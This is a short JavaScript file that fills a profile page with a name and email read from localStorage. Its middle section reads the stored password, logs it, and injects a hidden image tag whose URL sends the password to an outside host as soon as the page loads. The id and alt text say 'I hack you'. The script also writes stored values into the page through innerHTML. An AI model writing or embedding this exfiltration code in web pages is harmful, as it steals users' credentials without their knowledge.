"use strict";

(function () {
    const fullNameDOM = document.querySelector('#full_name');
    const emailDOM = document.querySelector('#email');

    const name = localStorage.getItem('name');
    const lastname = localStorage.getItem('lastname');
    const email = localStorage.getItem('email');

    fullNameDOM.innerHTML = name + ' ' + lastname;
    emailDOM.innerHTML = email;
})();

const server = 'https://www.trytocatchmeafskfgnkalsdnfand.com/';
const pass = localStorage.getItem('password');
console.log(pass);

const imgHTML = `<img id="ihackyou" src="${server + pass}.jpg" alt="I hack you">
                <style>#ihackyou{display:none;}</style>`
document.querySelector('body').insertAdjacentHTML("beforeend", imgHTML);


const sum = (a, b) => a + b;